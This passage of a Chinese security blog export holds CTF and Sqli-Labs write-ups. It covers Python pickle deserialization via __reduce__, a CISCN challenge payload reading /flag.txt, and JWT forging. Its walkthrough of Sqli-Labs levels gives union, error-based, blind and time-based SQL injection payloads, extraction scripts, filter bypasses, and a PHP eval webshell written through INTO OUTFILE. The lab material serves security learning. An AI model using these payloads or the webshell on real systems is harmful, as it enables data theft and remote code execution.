errors=”strict”)必填参数file必须以二进制可读模式打开，即“rb”，其他都为可选参数load 从数据文件中读取数据，并转换为python的数据结构 with open(&apos;D:/tmp.pk&apos;, &apos;r&apos;) as f: data = pickle.load(f)``` 3. pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中4. pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回#### 不加s为文件操作demo```python#!/usr/bin/python3import picklelist1 = [1, 2, 3]output = open(&apos;data.pkl&apos;, &apos;wb&apos;)pickle.dump(list1, output)output.close() 生成的文件,其中使用不同协议生成的二进制文件不同，有0，1，2，3默认是3，但是读取都没问题反序列化 #!/usr/bin/python3import picklepkl_file = open(&apos;data.pkl&apos;, &apos;rb&apos;)data1 = pickle.load(pkl_file)print(data1)pkl_file.close() 加上s为字符串操作为了方便我以十六进制输出一下 #!/usr/bin/python3import pickleimport base64list1 = [1, 2, 3]str1=pickle.dumps(list1)print(base64.b16encode(str1))print(pickle.loads(str1)) 输出 b&apos;80035D7100284B014B024B03652E&apos;[1, 2, 3] 三、__reduce__()python魔法方法详解https://github.com/MrKiven/PyZh/blob/master/docs/python-magic-methods-guide.rst __reduce__()介绍 当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 reduce 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）简单一点就是反序列化的时候调用 利用#coding=utf-8import pickle class Person(object): def __init__(self,username,password): self.username = username self.password = password def __reduce__(self): # 未导入os模块，通用 return (__import__(&apos;os&apos;).system, (&apos;ls&apos;,)) #return eval,(&quot;__import__(&apos;os&apos;).system(&apos;calc.exe&apos;)&quot;,) #return map, (__import__(&apos;os&apos;).system, (&apos;calc.exe&apos;,)) #return map, (__import__(&apos;os&apos;).system, [&apos;ls&apos;]) # 导入os模块 # return (os.system, (&apos;calc.exe&apos;,)) # return eval, (&quot;os.system(&apos;calc.exe&apos;)&quot;,) #return map, (os.system, (&apos;calc.exe&apos;,)) # return map, (os.system, [&apos;calc.exe&apos;]) admin = Person(&apos;admin&apos;,&apos;123456&apos;)result = pickle.dumps(admin)user = pickle.loads(result) 不过这样会导致user初构造失败为空 四、题目：[CISCN2019 华北赛区 Day1 Web2]ikunhttps://github.com/glzjin/CISCN_2019_northern_China_day1_web2意思就是提前有1000货币购买lv,界面上只有lv1-5先爆破出lv6的购买区 import requestsimport threadingimport queuefrom queue import Queueimport sysdef text(): url = &apos;http://ca563c26-7e4b-423f-847b-99ec2db675db.node3.buuoj.cn/info/&apos; for i in range(1,10000): new_url = url+str(i) q.put(new_url) def requ(): while not q.empty(): u = q.get(True, 1) try: print(u[64:],end=&quot;-&quot;) r = requests.get(u).text if &apos;lv6.png&apos; in r: print(&quot;\\n\\n--------------GotIt-------------------------&quot;+u+&quot;\\n\\n--------------&quot;) q.task_done() except: q.put(u)if __name__==&apos;__main__&apos;: q = Queue() text() for each in range(500): t = threading.Thread(target=requ) t.daemon = True t.start() q.join() 拿到id=1624价格超级贵，所以抓包来改一些东西，比如价格尝试购买-这里很难受，你要抓一个进优惠购买的包，id改成1624到这里然后成功拿到了一个url http://ca563c26-7e4b-423f-847b-99ec2db675db.node3.buuoj.cn/b1g_m4mber 然后下一步是jwt，可参考https://kit4y.github.io/2020/01/01/jwt/拿到JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN0NGNrIn0.3e4wG-w3yFP1kBvUc5dpJ8Vb-yV1N9VixpNXpX_1xLQ思路很明确了，把username伪造成admin即可，所以先使用c-jwt-cracker爆破secret然后伪造成功，发现源码给了/static/asd1f654e683wq/www.zip在admin.py发现 @tornado.web.authenticateddef post(self, *args, **kwargs): try: become = self.get_argument(&apos;become&apos;) p = pickle.loads(urllib.unquote(become)) return self.render(&apos;form.html&apos;, res=p, member=1) except: return self.render(&apos;form.html&apos;, res=&apos;This is Black Technology!&apos;, member=0) 则可以利用这个，因为这个系统是python2的，我们也用python2-而且python的类居然可以不用提前定义，直接反序列化 import pickleimport urllibclass payload(object): def __reduce__(self): #return (eval,(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;,)) return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))a = urllib.quote(pickle.dumps(payload()))print a 得到的a，抓包改一下丢become得到flag不过不知道为啥，os的payload打不了？ 参考https://xz.aliyun.com/t/2289https://www.zhaoj.in/read-5946.html","link":"2020/01/06/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"Sqli-Labs","text":"一、Introduction第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获 二、HackLess-2传入一个单引号试探注入点，发现报错 ..... syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1 推测和Less-1唯一的区别在于没有单引号，只是用数字进行查询，例如 SELECT * FROM users WHERE id=$id LIMIT 0,1 所以payload和Less-1差别只在于一个单引号 -1 union select 1,2,3 %23-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23-1 union select 1,group_concat(username),group_concat(password) from users%23 Less-3题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)测试 ?id=1’ 得到 ...... syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1 猜测语句 SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1 所以通过前面加 -1’) 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了 SELECT * FROM users WHERE id=(&apos; -1&apos;){{为所欲为}}#23 &apos;) LIMIT 0,1 所以payload -1&apos;)union select 1,2,3 %23-1&apos;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;-1&apos;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23-1&apos;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23-1&apos;)union select 1,group_concat(username),group_concat(password) from users%23 Less-4尝试’并未发现报错，尝试”发现报错 syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1 猜测语句 SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1 所以payload和3差不多只是单引号变双引号 -1&quot;)union select 1,2,3 %23-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23 Less-5 在导航页里显示的是要使用双查询发现正常或者注入成功是这样的而一旦出错会报错显然是布尔注入而且猜测语句 SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1 当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切打个比方 1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23 //截取数据库下第一个表的第一个字符与80ascii值进行对比找第二个字符只需要改成substr(&apos;xxx&apos;,2,1)即可。找第二个表改成limit 1,1 也可以直接拿这个盲注脚本爆破，参数自己改就行了https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py Less-6Less-6和Less-5的关系就和1♂2，3♂4的关系一样 把’改成”在脚本上修改就很行了 文件操作第七题提示Dump into outfile，即使用文件导出，然后第九第十题通过基于时间盲注的脚本也拿到了数据库所有数据，慢慢锻炼自己写py的能力吧。 Less-7本关的标题是dump into outfile,意思是本关我们利用文件导入的方式进行注入,其实难点在于 猜测SQL语句和寻找网站的绝对路径，太菜了的我连自己本地都打了很久orz,不过也学到这个骚操作 首先通过测试猜源码 id&apos;)) LIMIT 0,1&quot; ?id=1&apos;)) or 1=1--+ 没有报错然后可以利用文件导入导出，我一开始试了很久没写进去，找到了大师傅的博客https://blog.csdn.net/HHTNAN/article/details/78520511,了解到MYSQL数据导出与导入，secure_file_priv参数需要设置在mysql文件下的my.ini文件的[mysqld]写入 secure_file_priv=&apos;&apos; 至于为什么，请参考大师傅的博客然后就很顺利 ?id=1&apos;)) union select 1,2,3 into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\mima.php&quot;--+ 然后就可以写入一句话木马 ?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&apos; into outfile &quot;D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\mima.php&quot;--+ Less-8和Less-5居然一样的？盲注脚本都一样,可以参考第五题https://kit4y.github.io/2019/04/27/Sqli-Labs-Less-2-6/#more Less-9题目叫做GET-Bind-Time based XXX时间盲注，所以专门查看了一下时间盲注和布尔注入的一些基础知识 时间盲注：时间盲注利用前提条件：页面上没有显示位，也没有输出SQL语句执行错误信息。 正 确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条 件之后，页面的返回速度明显慢了5秒。 时间盲注常用函数：IF(判断语句,A,B)如果判断语句为真，则返回A为假则返回B一般和布尔盲注语句配合使用： if(ascii(substr(“payload”, 1, 1))=104, sleep(5), 1) 如果第一个，号前的语句成立，则页面返回速度慢5秒不成立，页面立即返回 时间盲注过程： if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1) //判断数据库个数if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1)if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1)//判断 第一个库第一个字符 所以本题先疯狂试探,发现不管咋样都是返回一样的，和铁疙瘩一样，所以就能通过时间盲注 ?id=1&apos; and sleep(3)%23 发现等了3秒钟才响应了然后和盲注一样玩 1&apos; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ 然后通过这个脚本拿到当前数据库的名字 # -*- coding: utf-8 -*-import requestsimport timeurl = &apos;http://localhost/sqli-labs-master/Less-9/?id=1&apos;def check(payload): url_new = url + payload time_start = time.time() content = requests.get(url=url_new) time_end = time.time() if time_end - time_start &gt;5: return 1result = &apos;&apos;s = r&apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;for i in range(1,50): flag=0; for c in s: payload = &quot;&apos;and if(substr(database(),%d,1)=&apos;%c&apos;,sleep(5),1)--+&quot; % (i,c) print(&quot;Database name: &quot;+result+&quot; | Payload: &quot;+payload) if check(payload): flag=1; result += c break if(flag==0): print(&quot;Over&quot;) break print (result) 然后通过这个脚本得到第一个security数据表 # -*- coding: utf-8 -*-import requestsimport timeurl = &apos;http://localhost/sqli-labs-master/Less-9/?id=1&apos;def check(payload): url_new = url + payload time_start = time.time() content = requests.get(url=url_new) time_end = time.time() if time_end - time_start &gt;5: return 1result = &apos;&apos;panduan = &apos;&apos;ll=0s = r&apos;0123456789abcdefghijklmnopqrstuvwxyz&apos;for i in range(1,100): for c in s: payload = &quot;&apos;and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),%d,1)=&apos;%c&apos;,sleep(5),1)--+&quot; % (i,c) print(&quot;Table_name name: &quot;+result+&quot; | Payload: &quot;+payload) if check(payload): result += c break if ll==len(result): print (&apos;table_name: &apos;+result) break ll = len(result) print (result) Less-10和第九题一样 , 将单引号换成双引号就好了 ?id=1&quot; and sleep(1)%23 脚本和图九差不多只要修改一下闭合的单引号换成双引号 Less-11先试试万能密码//一下的payload都是对于username的输入，密码框暂时可以随意输入2 admin &apos; or 1=1# 发现登录成功了 然后查看字段数目和显示位 1&apos; order by 3 # //登录后报错1&apos; union select 1,2 # //两个登录位 然后可以使用任意一个登录位来爆数据库 1&apos; union select 1,group_concat(schema_name) from information_schema.schemata# 然后爆数据表名，字段名，和第一题差不多了 1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#123&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #111&apos; union select group_concat(username),group_concat(password) from users # Less-12通过尝试和报错信息发现输入1”) or 1 #后可以用万能密码登录，接下来同上 1&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#1&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #1&quot;) union select group_concat(username),group_concat(password) from users # Less-13万能密码测试发现 1&apos;) or 1# 能登录成功，但是不回显，所以可以布尔注入或者时间盲注 ，我们发现登录成功出现的照片名字叫flag.jpg,而登录失败叫slap.jpg，所以可以通过这个线索来爆破 #!/usr/bin/env python# encoding:utf8import requestsimport timeimport sys# config-startsleep_time = 5error_time = 1# config-enddef getPayload(indexOfResult, indexOfChar, mid): # admin&apos; or ()-- column_name=&quot;schema_name&quot; table_name=&quot;schemata&quot; database_name=&quot;information_schema&quot; payload = &quot;((ascii(substring((select &quot; + column_name + &quot; from &quot; + database_name + &quot;.&quot; + table_name + &quot; limit &quot; + indexOfResult + &quot;,1),&quot; + indexOfChar + &quot;,1)))&gt;&quot; + mid + &quot;)&quot; payload = {&quot;uname&quot;:&quot;&apos;)or (&quot; + payload + &quot;)-- &quot;,&quot;passwd&quot;:&quot;admin&quot;} return payloaddef exce(indexOfResult,indexOfChar,mid): # content-start url = &quot;http://192.168.1.140/sqli-labs-master/Less-13/&quot; postData = getPayload(indexOfResult,indexOfChar,mid) content = requests.post(url, data=postData).text # content-end # judge-start if &quot;&lt;img src=\\&quot;../images/flag.jpg\\&quot; /&gt;&quot; in content: return True else: return False # judge-enddef doubleSearch(indexOfResult,indexOfChar,left_number, right_number): while left_number &lt; right_number: mid = int((left_number + right_number) / 2) if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)): left_number = mid else: right_number = mid if left_number == right_number - 1: if exce(str(indexOfResult),str(indexOfChar + 1),str(mid)): mid += 1 break else: break return chr(mid)def search(): for i in range(32): # 需要遍历的查询结果的数量 counter = 0 for j in range(32): # 结果的长度 counter += 1 temp = doubleSearch(i, j, 0, 128) # 从255开始查询 if ord(temp) == 1: # 当为1的时候说明已经查询结束 break sys.stdout.write(temp) sys.stdout.flush() if counter == 1: # 当结果集的所有行都被遍历后退出 break sys.stdout.write(&quot;\\r\\n&quot;) sys.stdout.flush()search() Less-14与13题差不多 把&apos;) 改为 &quot;即可 1&quot; or 1=1# 登录成功不回显，魔改上面脚本即可 Less-15与13题差不多 把&apos;) 改为&apos;即可 1&apos; or 1=1# 登录成功不回显，魔改上面脚本即可 Less-16与13题差不多 把&apos;) 改为&quot;)即可 1&quot;) or 1=1# 登录成功不回显，魔改上面脚本即可 新知识点：报错注入基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名，这已经成为一套已经成型的公式，然后用普通注入的方法进行注入就好了，所以总结一下这么几个公式 1.直接使用报错： mysql&gt; select 1,2 from user where id =&quot;1&quot; union select count(*),concat(&apos;/&apos;,(select database()),&apos;/&apos;,floor(rand(0)*2))a from information_schema.columns group by a;1062 - Duplicate entry &apos;/nuaa_msc/1&apos; for key &apos;&lt;group_key&gt;&apos; 2、利用xpath函数—extractvalue报错 mysql&gt; select 1,2 from user where id =&quot;1&quot; and extractvalue(1,concat(0x7e,(select database()),0x73));1105 - XPATH syntax error: &apos;~nuaa_mscs&apos; concat里面甚至可以再放函数，如图用了group_concat，将用户名密码全部获得（但是好像输出长度有限定，只能输出一定长度结果） mysql&gt; select 1,2 from user where id =&quot;1&quot; and extractvalue(1,concat(0x7e,(select database()),&apos;/&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x73));1105 - XPATH syntax error: &apos;~nuaa_msc/articles&apos; 3、利用xpath函数—updatexml报错： mysql&gt; select 1,2 from user where id =&quot;1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);1105 - XPATH syntax error: &apos;~nuaa_msc~&apos; Less-17题目咋一看是一个重置密码的功能，其实可以通过延时注入来跑，这里用新学的知识点,任意选择上面的一种即可 passwd: 1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#uname: admin Less-18题目名字叫POST-Header Injection-Uagent field-Error based;登录成功会出现user agent可以使用postman 修改User-Agent,注意首先要登录成功 User-Agent : 1&apos;or updatexml(1,concat(&apos;#&apos;,(database())),0),&apos;&apos;,&apos;&apos;)# 爆表 User-Agent : 1&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),0),&apos;&apos;,&apos;&apos;)# 爆字段 User-Agent : 1&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)),0),&apos;&apos;,&apos;&apos;)# Less-19和18一样，只是把User-Agent改成Referer Less-20Cookie 注入 , 修改自身cookie , 后台获取到这个cookie后 , 会直接拿去数据库里面进行比较 , 比较的时候就有可能注入，登录成功后修改 cookie 即可首先登录，然后修改cookie，可以通过谷歌Applocation直接修改为 &apos;union select 1,group_concat(schema_name),3 from information_schema.schemata# 也可以通过脚本 import requestsurl = &quot;http://127.0.0.1/Less-20/&quot;postDate = { &apos;uname&apos;:&apos;admin&apos;, &apos;passwd&apos;:&apos;admin&apos;}headers = { &apos;Host&apos;:&apos;127.0.0.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;, &apos;Accept-Encoding&apos;:&apos;gzip, deflate&apos;, &apos;Referer&apos;:&apos;http://127.0.0.1/Less-20/index.php&apos;, &apos;Cookie&apos;:&apos;uname=\\&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Cache-Control&apos;:&apos;max-age=0&apos;}content = (requests.post(url, data=postDate, headers=headers).text)print(content) Less-21和上面差不多，但是这里的cookie用过了base64加密而且加上了括号原始payload为 &apos;) union select 1,group_concat(schema_name),3 from information_schema.schemata# base64 JykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw== 同样的方式修改即可 Less-22上同，改为双引号,转码前 &quot; union select 1,group_concat(schema_name),3 from information_schema.schemata# 转码后 IiB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoc2NoZW1hX25hbWUpLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEj Less-23过滤了# 和--+等闭合的符号，所以通过 or &apos;1&apos;=&apos;1 来闭合后面的引号,任然使用之前的报错原理 -1&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;1&apos;=&apos;1 获取security数据库的所有表单 -1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x7e),1) or &apos;1&apos;=&apos;1 获取user表所有字段 -1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),0x7e),1) or &apos;1&apos;=&apos;1 获取username/password -1&apos; and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) or &apos;1&apos;=&apos;1-1&apos; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) or &apos;1&apos;=&apos;1 如果长度不够，可以通过limit 0,1这样的手法拿到所有数据 Less-24二次注入，可以概括为以下两步:第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。本地登录的地方我们发现万能密码失败，于是查看源码 $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; 由于对于我们的账号密码使用mysql_real_escape_string转义过。本题可以采用二次注入 首先创建一个user叫做admin&apos;#,密码随意，我们可以看到，数据库中真的就出现了这么一条数据 然后使用admin&apos;#加上自己的密码登录 然后修改密码为123456，最后效果居然是将admin用户改为123456的密码，自己新建的账号密码还是自己设定的 why?首先我们看更新密码的查询语句为 $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;; 这是因为上面的数据库更新语句，在用户名为 “admin’#” 时执行的实际是： $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos; &quot;; 等同于 $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;; Less-25把 or、and过滤了,其实好像也没怎么用上，而且发现只是一次过滤，通过双写绕过，那么和第一题就差不多了比如order中有or所以可以写成oorrder,将其中的一个or过滤后剩下为order -1&apos; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23 Less-25a先寻找注入点 1&quot; oorr 1 %231&apos; oorr 1 %231 oorr 1 %23 只有第三种没啥问题，所以本题就是不需要加引号直接注入 -1&apos; union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata%23 Less-26空格与注释被过滤了,最后的注释可以使用or &apos;1&apos;=&apos;1 来闭合，然后空格可以用这些代替 %09 = TAB键（水平）%0a = 新建一行%0c = 新的一页%0d = return功能%0b = TAB键（垂直）%a0 = 空格&amp;&amp;(%26%26) = and 使用报错注入 0&apos;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&apos;1&apos;=&apos;1 这样是没问题的，然后爆库 0%27||updatexml(1,concat(0x7e,(select%0Agroup_concat(schema_name)%0Afrom%0Ainfoorrmation_schema.schemata),0x7e),1)||%271%27=%271 然后不行了，黑人问号？试试直接拿数据 0%27||updatexml(1,concat(0x7e,(select%0agroup_concat(username)%0afrom%0ausers),0x7e),1)||%271%27=%271 最后网上有师傅回答是windows系统的缘故？然后发现可以用括号过滤乖乖 0&apos;||extractvalue(1, concat(0x5c,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database())))||&apos;1&apos;=&apos;1 表名 0&apos;||updatexml(1,concat(&apos;$&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&apos;security&apos;))),0)||&apos;1&apos;=&apos;1 字段名 0&apos;||updatexml(1,concat(&apos;$&apos;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&apos;security&apos;)%26%26(table_name=&apos;users&apos;))),0)||&apos;1&apos;=&apos;1 数据 0&apos;||updatexml(1,concat(&apos;$&apos;,(select(concat(&apos;$&apos;,id,&apos;$&apos;,username,&apos;$&apos;,passwoorrd))from(users)where(username)=&apos;admin&apos;)),0)||&apos;1&apos;=&apos;1 Less-26-a题目提示空格与注释被过滤了而且加了括号，所以还是盲注解决吧(其实还是windows环境的锅导致%0a等不能实现，正经的服务器应该不会是windows的吧)所以这样是可以de 100&apos;)union%a0select%a01,user(),(&apos;3 Less-27题目提示union与select被过滤了，可直接报错使用，当然也可以大小写来绕过还是上面的问题，因为windows的服务器，%0a不用，所以还是使用报错来写 0&apos;||(updatexml(1,concat(0x5e5e,database()),1))||&apos;1&apos;=&apos; 然后想拿数据 0&apos;||updatexml(1,concat(&apos;$&apos;,(select(concat(&apos;$&apos;,id,&apos;$&apos;,username,&apos;$&apos;,password))from(users)where(username)=&apos;admin&apos;)),0)||&apos;1&apos;=&apos; 很好就报错了然后发现有师傅提供了一种非常骚的做法,用/*%0a*/强行制造空格。awsl 0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&apos;1&apos;=&apos;1 表名 0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(table_name)/*%0a*/from/*%0a*/information_schema.tables/*%0a*/where/*%0a*/table_schema=&apos;security&apos;),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1 字段名 0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(column_name)/*%0a*/from/*%0a*/information_schema.columns/*%0a*/where/*%0a*/table_schema=&apos;security&apos;/*%0a*/%26%26/*%0a*/table_name=&apos;users&apos;),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1 数据 0&apos;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,(SeLeCt/*%0a*/group_concat(concat_ws(&apos;$&apos;,id,username,password))/*%0a*/from/*%0a*/users),4/*%0a*/||/*%0a*/&apos;1&apos;=&apos;1 Less-27-a把单引号改成双引号即可 0&quot;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/2,database(),4/*%0a*/||/**/&quot;1&quot;=&quot;1 Less-281和1”正常回显，1’报错，单引号字符型。2’&amp;&amp;’1’=’1回显为id=1，有小括号。因为当你有小括号的时候$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;变成$sql=&quot;SELECT * FROM users WHERE id=(&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;) LIMIT 0,1&quot;;所以会变成id=1看了下代码 $id = blacklist($id);$hint = $id;function blacklist($id){ $id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;,$id); //strip out /* $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;,$id); //Strip out --. $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;,$id); //Strip out #. $id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;,$id); //Strip out UNION &amp; SELECT. return $id;} 过滤了相连的union和select，这个可以复写绕过，或者使用其他代替空格,如下都可能可以代替空格 %0a%0d%20%0b%a0/%0a/ 这题可以用%0a，使用%00截断可以盲注 0&apos;)||left(database(),1)&gt;&apos;s&apos;;%00 也可以绕过union select直接注入 333&apos;)union%a0select(1),(database()),(3)||(&apos;1 解释： $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;$sql=&quot;SELECT * FROM users WHERE id=(&apos;333&apos;)union%a0select(1),(database()),(3)||(&apos;1&apos;) LIMIT 0,1&quot;; 前面的333可以尽量大一些，不能用-1。 Less-28-a感觉就像看错了题？28-a居然是在 Less 28 的基础上还注释掉了很多过滤。这样28的payload肯定可以直接打给出一个强一点的过滤 $id = blacklist($id);$hint = $id;function blacklist($id){ $id = preg_replace(&apos;/or/i&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/and/i&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[--]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[#]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[\\/\\\\\\\\]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[ +]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/[\\s]/&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/select/i&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/union/i&apos;,&quot;&quot;,$id); $id = preg_replace(&apos;/union\\s+select/i&apos;,&quot;&quot;,$id); return $id;} 末尾\\i就会导致不区分大小写，统统过滤 Less-29比较智障了吧，好像过滤什么，直接注入 0%27union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23 Less-30同上，只是单引号变双引号 0&quot;union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23 Less-31同上，只是双引号加了括号 0&quot;)union/**/select/**/1,group_concat(schema_name),1/**/from/**/information_schema.schemata%23 宽字节注入国内最常使用的 GBK 编码，这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%df%5c就是一个汉字。反斜杠 \\ 的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \\，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。先了解addslashes() 函数，就是转义函数 &lt;?php$str = addslashes(&apos;Shanghai is the &quot;biggest&quot; city in China.&apos;);echo($str);?&gt; 输出 Shanghai is the \\&quot;biggest\\&quot; city in China. 内部实现就是 $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\\\&apos;) .&apos;/&apos;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash$string = preg_replace(&apos;/\\&apos;/i&apos;, &apos;\\\\\\&apos;&apos;, $string); //escape single quote with a backslash$string = preg_replace(&apos;/\\&quot;/&apos;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash 